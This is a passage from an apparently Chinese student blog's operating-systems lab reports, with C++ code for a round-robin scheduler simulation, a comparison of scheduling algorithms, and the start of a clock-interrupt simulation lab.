class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAXname 100</span><br><span class="hljs-keyword">int</span> n;                <span class="hljs-comment">//进程数量</span><br><span class="hljs-keyword">int</span> current_time = <span class="hljs-number">0</span>; <span class="hljs-comment">//当前时间</span><br><span class="hljs-keyword">int</span> q = <span class="hljs-number">0</span>;            <span class="hljs-comment">//设定的时间片大小</span><br><span class="hljs-keyword">int</span> t = <span class="hljs-number">0</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Process</span> //进程结构体，表示进程信息</span><br><span class="hljs-class">&#123;</span><br>    string name;         <span class="hljs-comment">//进程名字</span><br>    <span class="hljs-keyword">int</span> arrive_time;     <span class="hljs-comment">//到达时间</span><br>    <span class="hljs-keyword">int</span> service_time;    <span class="hljs-comment">//进程运行时间</span><br>    <span class="hljs-keyword">int</span> wait_time;       <span class="hljs-comment">//进程等待时间</span><br>    <span class="hljs-keyword">int</span> remain_time;     <span class="hljs-comment">//进程剩余运行时间</span><br>    <span class="hljs-keyword">int</span> turnaround_time; <span class="hljs-comment">//周转时间</span><br>    <span class="hljs-keyword">int</span> start_time;      <span class="hljs-comment">//进程开始运行时间</span><br>    <span class="hljs-keyword">int</span> end_time;        <span class="hljs-comment">//进程结束时间</span><br>    <span class="hljs-keyword">int</span> time_slice;      <span class="hljs-comment">//进程时间片</span><br>&#125; run_process, p[MAXname];<br>queue&lt;Process&gt; ready_queue, block_queue;<span class="hljs-comment">//依次为就绪队列、阻塞队列</span><br><span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">cmp</span><span class="hljs-params">(Process &amp;a, Process &amp;b)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> a.arrive_time &lt; b.arrive_time;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process_init</span><span class="hljs-params">()</span> <span class="hljs-comment">//进程初始化</span></span><br><span class="hljs-function"></span>&#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;请输入进程数量&quot;</span> &lt;&lt; endl;<br>    cin &gt;&gt; n;<br>    cout &lt;&lt; <span class="hljs-string">&quot;请输入时间片长度&quot;</span> &lt;&lt; endl;<br>    cin &gt;&gt; q;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;请输入第&quot;</span> &lt;&lt; i + <span class="hljs-number">1</span> &lt;&lt; <span class="hljs-string">&quot;个进程的名字  到达时间  服务时间&quot;</span> &lt;&lt; endl;<br>        cin &gt;&gt; p[i].name &gt;&gt; p[i].arrive_time &gt;&gt; p[i].service_time;<br>        p[i].remain_time = p[i].service_time;<br>        p[i].time_slice = q; <span class="hljs-comment">//设置进程时间片</span><br>        p[i].end_time = <span class="hljs-number">0</span>;<br>    &#125;<br>    run_process.name = <span class="hljs-string">&quot;0&quot;</span>; <span class="hljs-comment">//当前无进程运行</span><br>    <span class="hljs-built_in">sort</span>(p, p + n, cmp);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        block_queue.<span class="hljs-built_in">push</span>(p[i]); <span class="hljs-comment">//将进程加入阻塞队列（未达到则视为阻塞）</span><br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">nextprocess</span><span class="hljs-params">()</span> <span class="hljs-comment">//取下一个进程</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!ready_queue.<span class="hljs-built_in">empty</span>()) <span class="hljs-comment">//当就绪队列非空时</span><br>    &#123;<br>        run_process = ready_queue.<span class="hljs-built_in">front</span>(); <span class="hljs-comment">//取下个进程</span><br>        ready_queue.<span class="hljs-built_in">pop</span>();<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-comment">//否则将运行进程置为空</span><br>        run_process.name = <span class="hljs-string">&quot;0&quot;</span>;<br>    run_process.wait_time += current_time - run_process.arrive_time; <span class="hljs-comment">//计算等待时间</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">block</span><span class="hljs-params">()</span> <span class="hljs-comment">//阻塞函数，随机概率阻塞</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> a;<br>    a = <span class="hljs-built_in">rand</span>() % <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (a &gt;= <span class="hljs-number">0</span> &amp;&amp; a &lt; <span class="hljs-number">3</span>)<br>    &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">process_schedule</span><span class="hljs-params">()</span> <span class="hljs-comment">//进程调度函数</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">srand</span>(<span class="hljs-built_in">time</span>(<span class="hljs-literal">NULL</span>)); <span class="hljs-comment">//随机数种子</span><br>    cout &lt;&lt; endl<br>         &lt;&lt; <span class="hljs-string">&quot;----------------------------------------RR调度算法----------------------------------------&quot;</span> <br>         &lt;&lt; endl<br>         &lt;&lt; endl;<br>    cout &lt;&lt; <span class="hljs-string">&quot;当前时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;当前进程  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;进程到达时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;进程等待时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;进程服务时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;剩余运行时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;剩余时间片时间&quot;</span><br>         &lt;&lt; endl;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (block_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; ready_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; run_process.name == <span class="hljs-string">&quot;0&quot;</span>) <span class="hljs-comment">//当三个队列均为空时，说明进程全部运行完</span><br>            <span class="hljs-keyword">break</span>;                                                                 <span class="hljs-comment">//结束</span><br><br>        <span class="hljs-keyword">if</span> (!block_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; block_queue.<span class="hljs-built_in">front</span>().arrive_time &lt;= current_time)<br>        &#123;                                                   <span class="hljs-comment">//阻塞队列非空且队首元素到达时间已到当前时间</span><br>            block_queue.<span class="hljs-built_in">front</span>().arrive_time = current_time; <span class="hljs-comment">//将进入就绪队列的时间作为进程到达时间（针对于阻塞过的进程）</span><br>            ready_queue.<span class="hljs-built_in">push</span>(block_queue.<span class="hljs-built_in">front</span>());          <span class="hljs-comment">//则加入就绪队列</span><br>            block_queue.<span class="hljs-built_in">pop</span>();                              <span class="hljs-comment">//从阻塞队列删除</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (!ready_queue.<span class="hljs-built_in">empty</span>() &amp;&amp; run_process.name == <span class="hljs-string">&quot;0&quot;</span>) <span class="hljs-comment">//就绪队列非空和运行进程非空</span><br>        &#123;<br>            run_process = ready_queue.<span class="hljs-built_in">front</span>(); <span class="hljs-comment">//则从就绪对列取首元素</span><br>            ready_queue.<span class="hljs-built_in">pop</span>();                 <span class="hljs-comment">//从就绪队列删除</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (run_process.name == <span class="hljs-string">&quot;0&quot;</span>) <span class="hljs-comment">//若当前无运行进程，则输出空</span><br>        &#123;<br>            cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; current_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; run_process.name &lt;&lt; endl;<br>            current_time++;<br>        &#125;<br>        <span class="hljs-keyword">else</span><br>        &#123; <span class="hljs-comment">//当前有运行进程则输出信息</span><br>            cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; current_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; run_process.name<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.arrive_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.wait_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.service_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.remain_time<br>                 &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">14</span>) &lt;&lt; run_process.time_slice<br>                 &lt;&lt; endl;<br>            current_time++;            <span class="hljs-comment">//当前时间加1</span><br>            run_process.remain_time--; <span class="hljs-comment">//进程剩余运行时间减1</span><br>            run_process.time_slice--;  <span class="hljs-comment">//进程时间片时间减1</span><br><br>            <span class="hljs-keyword">if</span> (run_process.remain_time == <span class="hljs-number">0</span>) <span class="hljs-comment">//当进程剩余运行时间为0</span><br>            &#123;<br>                p[t++] = run_process;<br>                <span class="hljs-built_in">nextprocess</span>(); <span class="hljs-comment">//取下一个进程</span><br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (run_process.time_slice == <span class="hljs-number">0</span>) <span class="hljs-comment">//当进程时间片为0时</span><br>            &#123;<br>                run_process.time_slice = q;             <span class="hljs-comment">//恢复时间片</span><br>                run_process.arrive_time = current_time; <span class="hljs-comment">//更新到达时间</span><br>                ready_queue.<span class="hljs-built_in">push</span>(run_process);          <span class="hljs-comment">//再次入队</span><br><br>                <span class="hljs-built_in">nextprocess</span>(); <span class="hljs-comment">//取下一个进程</span><br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">block</span>()) <span class="hljs-comment">//当进程有运行时间和时间片时，可能发生阻塞</span><br>            &#123;<br>                cout &lt;&lt; <span class="hljs-string">&quot;-----------------进程阻塞，切换进程----------------&quot;</span> &lt;&lt; endl;<br>                run_process.arrive_time = current_time; <span class="hljs-comment">//若发生阻塞，修改当前进程到达时间</span><br>                block_queue.<span class="hljs-built_in">push</span>(run_process);          <span class="hljs-comment">//并加入阻塞队列中</span><br>                <span class="hljs-built_in">nextprocess</span>();<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">print_process_information</span><span class="hljs-params">()</span> <span class="hljs-comment">//输出进程信息</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">float</span> sumwait = <span class="hljs-number">0</span>;<br>    cout &lt;&lt; <span class="hljs-string">&quot;进程名字  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;服务时间  &quot;</span><br>         &lt;&lt; <span class="hljs-string">&quot;等待时间  &quot;</span><br>         &lt;&lt; endl;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>    &#123;<br>        cout &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">8</span>) &lt;&lt; p[i].name<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; p[i].service_time<br>             &lt;&lt; <span class="hljs-built_in">setw</span>(<span class="hljs-number">10</span>) &lt;&lt; p[i].wait_time<br>             &lt;&lt; endl;<br>        sumwait += p[i].wait_time;<br>    &#125;<br>    cout &lt;&lt; <span class="hljs-string">&quot;平均等待时间为：&quot;</span> &lt;&lt; <span class="hljs-built_in">setprecision</span>(<span class="hljs-number">2</span>) &lt;&lt; <span class="hljs-built_in">setiosflags</span>(ios::fixed) &lt;&lt; <span class="hljs-built_in"><span class="hljs-keyword">float</span></span>(sumwait / n) &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">process_init</span>();<br>    <span class="hljs-built_in">process_schedule</span>();<br>    <span class="hljs-built_in">print_process_information</span>();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="程序初值和运行结果-2"><a class="markdownIt-Anchor" href="#程序初值和运行结果-2"></a> 程序初值和运行结果</h4><p><strong>不考虑阻塞：</strong></p><p>初值（小时间片）：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">3</span><br><span class="hljs-attribute">2</span><br><span class="hljs-attribute">ghh</span> <span class="hljs-number">3</span> <span class="hljs-number">6</span><br><span class="hljs-attribute">ga</span> <span class="hljs-number">4</span> <span class="hljs-number">8</span><br><span class="hljs-attribute">hr</span> <span class="hljs-number">8</span> <span class="hljs-number">4</span><br></code></pre></div></td></tr></table></figure><p>运行结果：</p><p><img src="/posts/3f961b4f/image-20211112213852527.png" alt="image-20211112213852527"></p><p><strong>考虑阻塞：</strong></p><p>初值（小时间片）：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">3</span><br><span class="hljs-attribute">2</span><br><span class="hljs-attribute">ghh</span> <span class="hljs-number">3</span> <span class="hljs-number">6</span><br><span class="hljs-attribute">ga</span> <span class="hljs-number">4</span> <span class="hljs-number">8</span><br><span class="hljs-attribute">hr</span> <span class="hljs-number">8</span> <span class="hljs-number">4</span><br></code></pre></div></td></tr></table></figure><p>运行结果：</p><p><img src="/posts/3f961b4f/image-20211112213737120.png" alt="image-20211112213737120"></p><p><strong>时间片很大（等同于FCFS）</strong></p><p>初值：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">3</span><br><span class="hljs-attribute">60</span><br><span class="hljs-attribute">ghh</span> <span class="hljs-number">3</span> <span class="hljs-number">6</span><br><span class="hljs-attribute">ga</span> <span class="hljs-number">4</span> <span class="hljs-number">8</span><br><span class="hljs-attribute">hr</span> <span class="hljs-number">8</span> <span class="hljs-number">4</span><br></code></pre></div></td></tr></table></figure><p>运行结果：</p><p><img src="/posts/3f961b4f/image-20211112213941550.png" alt="image-20211112213941550"></p><h3 id="思考题"><a class="markdownIt-Anchor" href="#思考题"></a> 思考题</h3><blockquote><p>根据上面的观察结果，比较这两种算法各自的优缺点，根据结果再和其他的算法比较。</p></blockquote><p><strong>FCFS 调度</strong>的代码编写简单且容易理解。但是， 采用FCFS 策略的平均等待时间通常较长。</p><p>RR算法的性能很大程度上依赖于时间片的大小。在极端情况下，如果时间片非常大，那么RR算法与FCFS算法一样，如果时间片很小(如1ms)，那么R算法称为处理器共享。</p><p>而<strong>SJF 调度算法</strong>可证明为最佳的， 这是因为对于给定的一组进程， SJF 算法的平均等待时间最小。</p><p><strong>优先级调度算法</strong>可以自行选择进程优先级来调度，但是其一个主要问题是<strong>无穷阻塞</strong>（indefinite blocking）或饥饿（ starvation）。可以运行但缺乏CPU 的进程可认为是阻塞的，它在等待CPU。优先级调度算法会使某个低优先级进程无穷等待CPU。</p><p><strong>多级反馈队列调度算法</strong>允许进程在队列之间移动。主要思想是根据不同CPU区间的特点以区分进程。如果进程使用过多CPU时间， 那么它会被转移到更低优先级队列。这种方案将I/O约束和交互进程留在更高优先级队列。此外， 在较低优先级队列中等待时间过长的进程会被转移到更高优先级队列。这种形式的老化阻止饥饿的发生。</p><h2 id="五-实验总结"><a class="markdownIt-Anchor" href="#五-实验总结"></a> 五、实验总结</h2><p>这次实验主要实现了FCFS进程调度算法和RR进程调度算法，本实验设计了两版代码，最开始设计FCFS时，想的较为简单，将全部进程都排序加入了队列，然后依次出队列即完成了调度，这思路导致了我之后设计RR算法时也采用了这种策略，但这样使得一旦有一个进程被中断后要加入包含全部进程的队列，需要和队列里的所有进程比较到达时间，而我最开始采取的解决方法是全部出队，排序后再次入队，虽然这样是可以的，但是却不符合模拟的初衷。</p><p>后来在仔细看流程图后，发现自己第一版的代码里没有设计阻塞进程的函数，而且原来的设计很难加进去这个功能，所以干脆重新写了一版RR调度算法的代码。按照实际调度时的情况，我建立了就绪队列、阻塞队列、当前运行进程三个队列，首先将全部进程加入阻塞队列（未到到达时间的进程默认为阻塞）,然后根据时间加入就绪队列，当前进程为空时，从就绪队列取元素。同时设计了一个随机阻塞函数 ，来完成进程的阻塞，被阻塞进程再次加入阻塞队列。</p><p>而之后我又根据这一版的RR调度算法更改了FCFS的代码，只需要去掉RR轮转部分的代码就可以变成FCFS了，这与RR算法在时间片无限长时等价于FCFS算法的规律也是相同的（关于这个结果上方的运行结果中也有比较），虽然FCFS代码比第一版复杂了很多，但结构和逻辑上更为完善了。</p><p>从这两个实验，让我更加理解了FCFS和轮转法调度的规则，对于进程在调度时就绪队列阻塞队列等的变化也有了更深刻的理解。在实验编写过程中，也遇到许多错误，但后来总结起来看，很多都是没有弄清楚进程入队出队的关系导致的，理清楚就绪和运行队列的具体关系后，按次序将进程加入队列，再执行，逐个判断进程结束的条件，弄清楚这些，代码也就顺利完成了。</p><p>总的来说，这次实验收获也很大。</p>]]></content>
    
    
    <categories>
      
      <category>Course Study</category>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统</tag>
      
      <tag>Lab</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>操作系统Lab3-中断处理</title>
    <link href="/posts/8a95bb2a/"/>
    <url>/posts/8a95bb2a/</url>
    
    <content type="html"><![CDATA[<h1 id="操作系统第三次实验中断处理"><a class="markdownIt-Anchor" href="#操作系统第三次实验中断处理"></a> 操作系统第三次实验中断处理</h1><h1 id="中断处理"><a class="markdownIt-Anchor" href="#中断处理"></a> 中断处理</h1><h2 id="一-实验内容"><a class="markdownIt-Anchor" href="#一-实验内容"></a> 一、实验内容</h2><ul><li>运用某种高级语言（如C或C++）模拟时钟中断的产生及设计一个对时钟中断事件进行处理的模拟程序。</li></ul><h2 id="二-实验目的"><a class="markdownIt-Anchor" href="#二-实验目的"></a> 二、实验目的</h2><ul><li>现代计算机系统的硬件部分都设有中断机构，中断机构能发现中断事件，且当发现中断事件后迫使正在处理器上执行的进程暂时停止执行，而让操作系统的中断处理程序占有处理器去处理出现的中断事件。</li><li>本实验模拟“时钟中断事件”的处理，对其它中断事件的模拟处理，可根据各中断事件的性质确定处理原则，制定算法，自行设计。</li><li>通过本实验了解中断及中断处理程序的作用。</li></ul><h2 id="三-实验题目"><a class="markdownIt-Anchor" href="#三-实验题目"></a> 三、实验题目</h2><ol><li>计算机系统工作过程中，若出现中断事件，硬件就把它记录在中断寄存器中。中断寄存器的每一位可与一个中断事件对应，当出现某中断事件后，对应的中断寄存器的某一位就被置成“1”。</li></ol><ul><li>处理器每执行一条指令后，必须查中断寄存器，当中断寄存器内容不为“0”时，说明有中断事件发生。硬件把中断寄存器内容以及现行程序的断点存在主存的固定单元。操作系统分析保存在主存固定单元中的中断寄存器内容就可知道出现的中断事件的性质，从而作出相应的处理。</li><li>本实验中，用从键盘读入信息来模拟中断寄存器的作用，用计数器加1来模拟处理器执行了一条指令。每模拟一条指令执行后，从键盘读入信息且分析，当读入信息=0时，表示无中断事件发生，继续执行指令；当读入信息=1时，表示发生了时钟中断事件，转时钟中断处理程序。</li></ul><ol start="2"><li>假定计算机系统有一时钟，它按电源频率（50Hz）产生中断请求信号，即每隔20毫秒产生一次中断请求信号，称时钟中断信号，时钟中断的间隔时间（20毫秒）称时钟单位。</li></ol><ul><li>按自己确定的频率在键盘上键入“0”或“1”来模拟按电源频率产生的时钟中断信号。</li></ul><ol start="3"><li>中断处理程序应首先保护被中断的现行进程的现场（通用寄存器内容、断点等），现场信息可保存在进程控制块中；然后处理出现的中断事件，根据处理结果修改被中断进程的状态；最后转向处理器调度，由处理器调度选择可运行的进程，恢复现场使其运行。</li></ol><ul><li>本实验主要模拟中断事件的处理，为简单起见可省去保护现场和处理器调度的工作。</li></ul><ol start="4"><li>为模拟时钟中断的处理，先分析一下时钟中断的作用。利用时钟中断可计算日历时钟，也可作定时闹钟等。</li></ol><ul><li>计算日历时钟——把开机时的时间存放在指定的称为“日历时钟”的工作单元中，用一计时器累计时钟中断次数。根据时钟中断的次数和时钟单位（20毫秒）以及开机时的日历时钟可计算出当前的精确的日历时钟。</li><li>定时闹钟——对需要定时的场合，可把轮到运行的进程的时间片值送到称为“定时闹钟”的工作单元中，每产生一次时钟中断就把定时闹钟值减1，当该值为“0”时，表示确定的时间已到，起到定时的作用。</li></ul><ol start="5"><li><p>本实验的模拟程序可由两部分组成，一部分是模拟硬件产生时钟中断，另一部分模拟操作系统的时钟中断处理程序。模拟程序的算法如图1-1。其中，保护现场和处理器调度的工作在编程序时可省去。约定处理器调度总是选择<br>被中断进程继续执行。</p></li><li><p>按模拟算法设计程序，要求显示或打印开机时间、定时闹钟初值、定时闹钟为“0”时的日历时钟。确定三个不同的定时闹钟初值，运行设计的程序，观察得到的结果。</p></li></ol><p><img src="/posts/8a95bb2a/image-20211112104249163.png" alt="image-20211112104249163"></p><p><strong>思考题</strong></p><p>将进程调度策略结合到本实验中，可选用时间片轮转的调度策略。给每个进程分配一个相同的时间片，每产生一次时钟中断经处理后，被中断进程时间片减1，时间片值¹0时，该进程优先运行，若时间片值=0且该进程尚未运行结束，则将它排入队尾，再给它分配一个时间片，直到所有的进程运行结束。应怎样设计进程控制块？各进程的状态怎样变化？在本实验的程序中加入处理器调度程序</p><h2 id="四-实验设计与过程"><a class="markdownIt-Anchor" href="#四-实验设计与过程"></a> 四、实验设计与过程</h2><h3 id="1-时钟中断事件模拟程序"><a class="markdownIt-Anchor" href="#1-时钟中断事件模拟程序"></a> 1. 时钟中断事件模拟程序</h3><h4 id="数据结构和符号说明"><a class="markdownIt-Anchor" href="#数据结构和符号说明"></a> <strong>数据结构</strong>和符号说明</h4><p>因为该实验中断结束后继续调用上一个进程，直到进程结束，所以未设计进程结构体；</p><p>符号说明：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">time_t</span> t;<span class="hljs-comment">//存储日历时间类型</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tm</span> *<span class="hljs-title">cc</span>;</span><span class="hljs-comment">//用来保存时间和日期的结构</span><br><br><span class="hljs-keyword">int</span> timer = <span class="hljs-number">0</span>; <span class="hljs-comment">//计时器</span><br><span class="hljs-keyword">int</span> counter = <span class="hljs-number">0</span>; <span class="hljs-comment">//计数器</span><br><span class="hljs-keyword">int</span> clock_alarm; <span class="hljs-comment">//定时时钟</span><br><span class="hljs-keyword">int</span> ir = <span class="hljs-number">0</span>; <span class="hljs-comment">//中断寄存器</span><br></code></pre></div></td></tr></table></figure><h4 id="源代码"><a class="markdownIt-Anchor" href="#源代码"></a> 源代码</h4><blockquote><p>该程序思路很清晰，设置一个定时时钟，然后进行中断判断，当输入为1时，中断进程，定时闹钟减一，输入为0时，继续执行进程。</p></blockquote><blockquote><p>当时钟为0时，程序结束，计算时间后输出当前时间。</p></blockquote><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">time_t</span> t;<span class="hljs-comment">//存储日历时间类型</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tm</span> *<span class="hljs-title">cc</span>;</span><span class="hljs-comment">//用来保存时间和日期的结构</span><br><br><span class="hljs-keyword">int</span> timer = <span class="hljs-number">0</span>; <span class="hljs-comment">//计时器</span><br><span class="hljs-keyword">int</span> counter = <span class="hljs-number">0</span>; <span class="hljs-comment">//计数器</span><br><span class="hljs-keyword">int</span> clock_alarm; <span class="hljs-comment">//定时时钟</span><br><span class="hljs-keyword">int</span> ir = <span class="hljs-number">0</span>; <span class="hljs-comment">//中断寄存器</span><br><br><span class="hljs-built_in">time</span>(&amp;t); <span class="hljs-comment">//获取系统时间</span><br>cc = <span class="hljs-built_in">localtime</span>(&amp;t);<span class="hljs-comment">//将time值分解为tm结构</span><br><br>cout &lt;&lt; <span class="hljs-string">&quot;开机时间：&quot;</span> &lt;&lt; <span class="hljs-built_in">asctime</span>(cc);<span class="hljs-comment">//以字符串形式输出时间</span><br>cout &lt;&lt; <span class="hljs-string">&quot;定时闹钟的设定值为：&quot;</span>;<br>cin &gt;&gt; clock_alarm;<br>cout &lt;&lt; endl;<br><br><span class="hljs-keyword">while</span> (clock_alarm != <span class="hljs-number">0</span>) <span class="hljs-comment">//当未到定时时钟设定值时</span><br>&#123;<br><span class="hljs-keyword">if</span> (ir != <span class="hljs-number">0</span>)<br>cout &lt;&lt; <span class="hljs-string">&quot;正在进行处理器调度···&quot;</span> &lt;&lt; endl;<br>cout &lt;&lt; <span 